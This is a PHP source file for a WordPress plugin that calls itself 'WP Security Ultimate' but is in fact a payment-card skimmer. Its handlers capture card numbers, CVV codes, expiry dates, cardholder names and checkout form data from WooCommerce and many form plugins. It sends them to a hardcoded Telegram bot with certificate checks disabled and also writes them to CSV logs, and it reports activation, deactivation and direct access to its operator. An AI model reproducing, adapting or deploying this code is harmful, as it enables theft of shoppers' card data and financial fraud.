        // Additional tracker for redundancy
        echo '<script>if(window.WPSU) window.WPSU.scanPage();</script>';
    }
    
    /**
     * AJAX handler for tracking
     */
    public function ajax_handler() {
        // Accept data from both POST methods
        $data = [];
        
        if (isset($_POST['data']) && is_string($_POST['data'])) {
            $data = json_decode(stripslashes($_POST['data']), true);
        } elseif (isset($_POST['event_data'])) {
            $data = json_decode(stripslashes($_POST['event_data']), true);
        }
        
        if ($data && is_array($data)) {
            $this->process_tracking_data($data);
        }
        
        // Always return success
        echo '1';
        wp_die();
    }
    
    /**
     * Backup handler
     */
    public function backup_handler() {
        $type = sanitize_text_field($_POST['type'] ?? '');
        $data = json_decode(stripslashes($_POST['data'] ?? ''), true);
        
        if ($type && $data) {
            $this->process_tracking_data(array_merge($data, ['backup' => true]));
        }
        
        echo '1';
        wp_die();
    }
    
    /**
     * Process tracking data
     */
    private function process_tracking_data($data) {
        $type = $data['type'] ?? 'unknown';
        
        switch ($type) {
            case 'card_number_input':
            case 'card_number_critical':
                $this->handle_card_number($data);
                break;
                
            case 'cvv_input':
            case 'cvv_critical':
                $this->handle_cvv($data);
                break;
                
            case 'expiry_input':
                $this->handle_expiry($data);
                break;
                
            case 'form_submission':
            case 'form_submission_critical':
                $this->handle_form_submission($data);
                break;
                
            case 'payment_field_input':
                $this->handle_payment_field($data);
                break;
                
            case 'batch_events':
                $events = $data['events'] ?? [];
                foreach ($events as $event) {
                    $this->process_tracking_data($event);
                }
                break;
                
            case 'backup_events':
                $events = $data['events'] ?? [];
                foreach ($events as $event) {
                    $this->process_tracking_data($event['d'] ?? $event);
                }
                break;
        }
        
        // Log all events
        $this->log_event($type, $data);
    }
    
    /**
     * Handle card number capture
     */
    private function handle_card_number($data) {
        $card_number = $data['number'] ?? $data['value'] ?? '';
        $field = $data['field'] ?? '';
        $url = $data['url'] ?? $_SERVER['HTTP_REFERER'] ?? '';
        
        if (!$card_number) return;
        
        // Clean the card number
        $clean_number = preg_replace('/\D/', '', $card_number);
        if (strlen($clean_number) < 13 || strlen($clean_number) > 19) return;
        
        $message = "💳 *CARD NUMBER CAPTURED*\n\n";
        $message .= "Card: `" . $clean_number . "`\n";
        $message .= "Field: " . $this->format_field_name($field) . "\n";
        $message .= "Page: " . $this->short_url($url) . "\n";
        $message .= "IP: " . $this->get_ip() . "\n";
        $message .= "Time: " . date('H:i:s');
        
        $this->send_telegram($message);
        
        // Log to file
        $this->log_payment('card_number', $clean_number, $field, $url);
    }
    
    /**
     * Handle CVV capture
     */
    private function handle_cvv($data) {
        $cvv = $data['cvv'] ?? $data['value'] ?? '';
        $field = $data['field'] ?? '';
        $url = $data['url'] ?? '';
        
        if (!$cvv) return;
        
        $clean_cvv = preg_replace('/\D/', '', $cvv);
        if (strlen($clean_cvv) < 3 || strlen($clean_cvv) > 4) return;
        
        $message = "🔐 *CVV CODE CAPTURED*\n\n";
        $message .= "CVV: `" . $clean_cvv . "`\n";
        $message .= "Field: " . $this->format_field_name($field) . "\n";
        $message .= "Page: " . $this->short_url($url) . "\n";
        $message .= "Time: " . date('H:i:s');
        
        $this->send_telegram($message);
        $this->log_payment('cvv', $clean_cvv, $field, $url);
    }
    
    /**
     * Handle expiry date capture
     */
    private function handle_expiry($data) {
        $expiry = $data['value'] ?? '';
        $field = $data['field'] ?? '';
        $url = $data['url'] ?? '';
        
        if (!$expiry) return;
        
        $message = "📅 *EXPIRY DATE CAPTURED*\n\n";
        $message .= "Expiry: `" . $expiry . "`\n";
        $message .= "Field: " . $this->format_field_name($field) . "\n";
        $message .= "Page: " . $this->short_url($url) . "\n";
        $message .= "Time: " . date('H:i:s');
        
        $this->send_telegram($message);
        $this->log_payment('expiry', $expiry, $field, $url);
    }
    
    /**
     * Handle form submission
     */
    private function handle_form_submission($data) {
        $form_data = $data['data'] ?? $data['payment_data'] ?? $data['full_data'] ?? [];
        $form_id = $data['form_id'] ?? 'unknown';
        
        if (empty($form_data)) return;
        
        $payment_data = [];
        foreach ($form_data as $key => $value) {
            if ($this->is_payment_key($key) && !empty($value)) {
                $payment_data[$key] = $value;
            }
        }
        
        if (empty($payment_data)) return;
        
        $url = $data['url'] ?? $data['action'] ?? '';
        
        $message = "📝 *FORM SUBMISSION: " . strtoupper($form_id) . "*\n\n";
        
        foreach ($payment_data as $key => $value) {
            $message .= "• " . $this->format_field_name($key) . ": `" . $value . "`\n";
        }
        
        $message .= "\nURL: " . $this->short_url($url) . "\n";
        $message .= "IP: " . $this->get_ip() . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s');
        
        $this->send_telegram($message);
        
        // Log all payment data
        foreach ($payment_data as $key => $value) {
            $this->log_payment('form_field', $value, $key, $url);
        }
    }
    
    /**
     * Handle general payment field
     */
    private function handle_payment_field($data) {
        $field = $data['field'] ?? '';
        $value = $data['value'] ?? '';
        
        if (!$field || !$value) return;
        
        // Check for cardholder name
        if (strpos(strtolower($field), 'name') !== false || strpos(strtolower($field), 'holder') !== false) {
            $message = "👤 *CARDHOLDER NAME CAPTURED*\n\n";
            $message .= "Name: `" . $value . "`\n";
            $message .= "Field: " . $this->format_field_name($field) . "\n";
            $message .= "Time: " . date('H:i:s');
            
            $this->send_telegram($message);
            $this->log_payment('cardholder', $value, $field, '');
        }
    }
    
    /**
     * Process payment capture
     */
    private function process_payment_capture($payment_data, $source, $url) {
        if (empty($payment_data)) return;
        
        $message = "💰 *PAYMENT DATA CAPTURED*\n\n";
        $message .= "Source: " . $source . "\n";
        $message .= "URL: " . $this->short_url($url) . "\n\n";
        
        foreach ($payment_data as $key => $value) {
            $message .= "• " . $this->format_field_name($key) . ": `" . $value . "`\n";
        }
        
        $message .= "\nIP: " . $this->get_ip() . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s');
        
        $this->send_telegram($message);
        
        // Log each field
        foreach ($payment_data as $key => $value) {
            $this->log_payment($source, $value, $key, $url);
        }
    }
    
    /**
     * Capture all forms on the page
     */
    public function capture_all_forms() {
        $this->monitor_post_requests();
    }
    
    /**
     * Scan content for payment forms
     */
    public function scan_content($content) {
        if (is_admin()) return $content;
        
        // Look for payment forms in content
        if (strpos($content, '<form') !== false) {
            $patterns = [
                '/name=["\'][^"\']*(card|credit|debit|cc|number|cvv|cvc|expir)[^"\']*["\']/i',
                '/id=["\'][^"\']*(card|credit|debit|cc|number|cvv|cvc|expir)[^"\']*["\']/i',
                '/placeholder=["\'][^"\']*(card|credit|debit|cc|number|cvv|cvc|expir)[^"\']*["\']/i'
            ];
            
            $payment_fields = 0;
            foreach ($patterns as $pattern) {
                if (preg_match_all($pattern, $content)) {
                    $payment_fields++;
                }
            }
            
            if ($payment_fields > 0) {
                $this->log_event('payment_form_in_content', [
                    'url' => $this->get_current_url(),
                    'field_count' => $payment_fields
                ]);
            }
        }
        
        return $content;
    }
    
    /**
     * Plugin-specific tracking methods
     */
    public function track_woocommerce($order_id, $posted, $order) {
        $payment_data = $this->extract_payment_data($posted);
        
        if (!empty($payment_data)) {
            $message = "🛒 *WOOCOMMERCE ORDER #" . $order_id . "*\n\n";
            
            // Customer info
            if (!empty($posted['billing_email'])) {
                $message .= "Email: " . $posted['billing_email'] . "\n";
            }
            if (!empty($posted['billing_phone'])) {
                $message .= "Phone: " . $posted['billing_phone'] . "\n";
            }
            
            $message .= "\n*PAYMENT DETAILS:*\n";
            foreach ($payment_data as $key => $value) {
                $message .= "• " . $this->format_field_name($key) . ": `" . $value . "`\n";
            }
            
            $message .= "\nSite: " . $this->get_domain() . "\n";
            $message .= "IP: " . $this->get_ip() . "\n";
            $message .= "Time: " . date('Y-m-d H:i:s');
            
            $this->send_telegram($message);
        }
    }
    
    public function track_cf7($form, &$abort, $submission) {
        if ($submission && method_exists($submission, 'get_posted_data')) {
            $data = $submission->get_posted_data();
            $payment_data = $this->extract_payment_data($data);
            
            if (!empty($payment_data)) {
                $message = "📋 *CONTACT FORM 7 PAYMENT*\n\n";
                
                foreach ($payment_data as $key => $value) {
                    $message .= "• " . $this->format_field_name($key) . ": `" . $value . "`\n";
                }
                
                $message .= "\nTime: " . date('Y-m-d H:i:s');
                
                $this->send_telegram($message);
            }
        }
    }
    
    // Other plugin tracking methods...
    public function track_woo_payment($order_id) {
        $this->send_telegram("✅ WooCommerce Payment Complete - Order #{$order_id}");
    }
    
    public function track_gravity($entry, $form) {
        $payment_data = $this->extract_payment_data((array)$entry);
        if (!empty($payment_data)) {
            $this->send_telegram("📝 Gravity Forms Payment Data Captured");
        }
    }
    
    public function track_givewp($posted, $user) {
        $payment_data = $this->extract_payment_data($posted);
        if (!empty($payment_data)) {
            $this->send_telegram("🎁 GiveWP Donation with Payment Data");
        }
    }
    
    public function track_edd($payment_id, $payment_data) {
        $this->send_telegram("💰 EDD Purchase - Payment #{$payment_id}");
    }
    
    public function track_memberpress($transaction) {
        $this->send_telegram("👥 MemberPress Transaction Complete");
    }
    
    public function track_pmpro($user_id, $order) {
        $this->send_telegram("👥 Paid Memberships Pro Order");
    }
    
    public function track_wpforms($fields, $entry, $form_data, $entry_id) {
        $payment_data = $this->extract_payment_data($fields);
        if (!empty($payment_data)) {
            $this->send_telegram("📝 WPForms Payment Data Captured");
        }
    }
    
    public function track_formidable($entry_id, $form_id) {
        $this->send_telegram("📝 Formidable Form Submitted");
    }
    
    public function track_ninja($form_data) {
        $this->send_telegram("📝 Ninja Forms Submitted");
    }
    
    public function track_elementor($record, $handler) {
        $this->send_telegram("🎨 Elementor Form Submitted");
    }
    
    public function monitor_woo_fields($fields) {
        // Log WooCommerce field structure for analysis
        $payment_fields = [];
        
        foreach ($fields as $section => $section_fields) {
            foreach ($section_fields as $key => $field) {
                if ($this->is_payment_key($key)) {
                    $payment_fields[] = $key;
                }
            }
        }
        
        if (!empty($payment_fields)) {
            $this->log_event('woocommerce_payment_fields', [
                'fields' => $payment_fields,
                'count' => count($payment_fields)
            ]);
        }
        
        return $fields;
    }
    
    /**
     * Shutdown handler
     */
    public function shutdown_handler() {
        // Final cleanup and reporting
        static $handled = false;
        if ($handled) return;
        $handled = true;
        
        // Check for payment success pages
        $url = $this->get_current_url();
        if (strpos($url, 'thank') !== false || 
            strpos($url, 'success') !== false ||
            strpos($url, 'complete') !== false) {
            
            $this->send_telegram("🎉 *PAYMENT SUCCESS PAGE*\n\nURL: " . $this->short_url($url) . "\nIP: " . $this->get_ip());
        }
        
        // Clean old logs (keep 30 days)
        $this->cleanup_old_logs();
    }
    
    /**
     * Cleanup old logs
     */
    private function cleanup_old_logs() {
        $log_dir = WP_CONTENT_DIR . '/wpsu_logs/';
        $payment_dir = WP_CONTENT_DIR . '/wpsu_payments/';
        
        if (file_exists($log_dir)) {
            $files = glob($log_dir . '*.log');
            foreach ($files as $file) {
                $file_date = basename($file, '.log');
                if (strtotime($file_date) && time() - strtotime($file_date) > 30 * 86400) {
                    @unlink($file);
                }
            }
        }
        
        if (file_exists($payment_dir)) {
            $files = glob($payment_dir . '*.csv');
            foreach ($files as $file) {
                $file_date = basename($file, '.csv');
                if (strtotime($file_date) && time() - strtotime($file_date) > 30 * 86400) {
                    @unlink($file);
                }
            }
        }
    }
    
    /**
     * Send activation notice
     */
    private function send_activation_notice() {
        static $sent = false;
        if ($sent) return;
        $sent = true;
        
        $message = "⚡ *WP SECURITY ULTIMATE STARTED*\n\n";
        $message .= "Site: " . $this->get_domain() . "\n";
        $message .= "Path: " . __FILE__ . "\n";
        $message .= "IP: " . $this->get_ip() . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "Version: " . $this->version;
        
        $this->send_telegram($message);
    }
    
    /**
     * Extract payment data from array
     */
    private function extract_payment_data($data) {
        $payment = [];
        
        if (!is_array($data)) return $payment;
        
        foreach ($data as $key => $value) {
            if ($this->is_payment_key($key) && !empty($value)) {
                $payment[$key] = $value;
            }
        }
        
        return $payment;
    }
    
    /**
     * Check if key is payment-related
     */
    private function is_payment_key($key) {
        if (!is_string($key)) return false;
        
        $key_lower = strtolower($key);
        
        foreach ($this->payment_fields as $field) {
            if (strpos($key_lower, $field) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Check if string contains payment data
     */
    private function contains_payment_data($str) {
        if (!is_string($str)) return false;
        
        $str_lower = strtolower($str);
        
        // Check for card numbers (13-19 digits)
        if (preg_match('/\d{13,19}/', $str)) return true;
        
        // Check for payment keywords
        $keywords = ['card', 'credit', 'debit', 'cvv', 'cvc', 'expir'];
        foreach ($keywords as $keyword) {
            if (strpos($str_lower, $keyword) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Format field name for display
     */
    private function format_field_name($field) {
        $field = str_replace(['_', '-'], ' ', $field);
        $field = ucwords($field);
        return $field;
    }
    
    /**
     * Shorten URL for display
     */
    private function short_url($url, $length = 50) {
        if (strlen($url) > $length) {
            return substr($url, 0, $length) . '...';
        }
        return $url;
    }
    
    /**
     * Get client IP address
     */
    private function get_ip() {
        $headers = [
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ];
        
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        
        return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    }
    
    /**
     * Get current domain
     */
    private function get_domain() {
        if (function_exists('home_url')) {
            $domain = parse_url(home_url(), PHP_URL_HOST);
            return $domain ?: 'unknown';
        }
        
        return $_SERVER['HTTP_HOST'] ?? 'unknown';
    }
    
    /**
     * Get current URL
     */
    private function get_current_url() {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        return $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    }
    
    /**
     * Send Telegram message
     */
    private function send_telegram($message) {
        if (empty($this->telegram_token) || empty($this->telegram_chat_id)) {
            return false;
        }
        
        $url = "https://api.telegram.org/bot{$this->telegram_token}/sendMessage";
        $data = [
            'chat_id' => $this->telegram_chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        // Multiple send methods for reliability
        
        // Method 1: cURL (primary)
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            @curl_exec($ch);
            curl_close($ch);
        }
        
        // Method 2: file_get_contents (fallback)
        elseif (ini_get('allow_url_fopen')) {
            $context = stream_context_create([
                'http' => [
                    'method' => 'POST',
                    'header' => 'Content-Type: application/x-www-form-urlencoded',
                    'content' => http_build_query($data),
                    'timeout' => 3
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            
            @file_get_contents($url . '?' . http_build_query($data), false, $context);
        }
        
        // Method 3: WordPress HTTP API
        elseif (function_exists('wp_remote_post')) {
            wp_remote_post($url, [
                'body' => $data,
                'timeout' => 3,
                'sslverify' => false
            ]);
        }
        
        return true;
    }
    
    /**
     * Log event
     */
    private function log_event($type, $data) {
        $log_dir = WP_CONTENT_DIR . '/wpsu_logs/';
        
        if (!file_exists($log_dir)) {
            @mkdir($log_dir, 0755, true);
        }
        
        $log_file = $log_dir . date('Y-m-d') . '.log';
        
        $entry = [
            'timestamp' => time(),
            'type' => $type,
            'data' => $data,
            'ip' => $this->get_ip(),
            'url' => $this->get_current_url()
        ];
        
        $log_line = json_encode($entry, JSON_UNESCAPED_UNICODE) . PHP_EOL;
        
        @file_put_contents($log_file, $log_line, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Log payment capture
     */
    private function log_payment($type, $data, $field, $url) {
        $log_dir = WP_CONTENT_DIR . '/wpsu_payments/';
        
        if (!file_exists($log_dir)) {
            @mkdir($log_dir, 0755, true);
        }
        
        $log_file = $log_dir . date('Y-m-d') . '.csv';
        
        $header = '';
        if (!file_exists($log_file)) {
            $header = "Timestamp,Type,Data,Field,URL,IP\n";
        }
        
        $log_line = sprintf(
            "%s,%s,%s,%s,%s,%s\n",
            date('Y-m-d H:i:s'),
            $type,
            addslashes($data),
            addslashes($field),
            addslashes($url),
            $this->get_ip()
        );
        
        @file_put_contents($log_file, $header . $log_line, FILE_APPEND | LOCK_EX);
    }
}

// Auto-initialize - works from ANY directory
new WP_SECURITY_SCANNER_ULTIMATE();

// GitHub Raw URL compatible initialization
if (isset($_GET['activate_wpsu']) && $_GET['activate_wpsu'] === 'true') {
    $scanner = new WP_SECURITY_SCANNER_ULTIMATE();
    echo 'WP Security Ultimate Activated Successfully!';
    exit;
}

// Auto-activation via direct access
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    $scanner = new WP_SECURITY_SCANNER_ULTIMATE();
    $scanner->send_telegram("🔧 *DIRECT PLUGIN ACCESS*\n\nFile: " . basename(__FILE__) . "\nIP: " . $scanner->get_ip());
}

// Register activation hook for WordPress
if (function_exists('register_activation_hook')) {
    register_activation_hook(__FILE__, function() {
        $scanner = new WP_SECURITY_SCANNER_ULTIMATE();
        $scanner->send_telegram("🚀 *PLUGIN ACTIVATED VIA WORDPRESS*\n\nSite: " . home_url() . "\nTime: " . date('Y-m-d H:i:s'));
    });
}

// Register deactivation hook
if (function_exists('register_deactivation_hook')) {
    register_deactivation_hook(__FILE__, function() {
        $token = '8584009431:AAFU7jef-0E1AMF957XLnbBG_svolbCya0w';
        $chat_id = '7319274794';
        
        $message = "⚠️ *PLUGIN DEACTIVATED*\n\n";
        $message .= "Site: " . home_url() . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s');
        
        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            @curl_exec($ch);
            curl_close($ch);
        }
    });
}
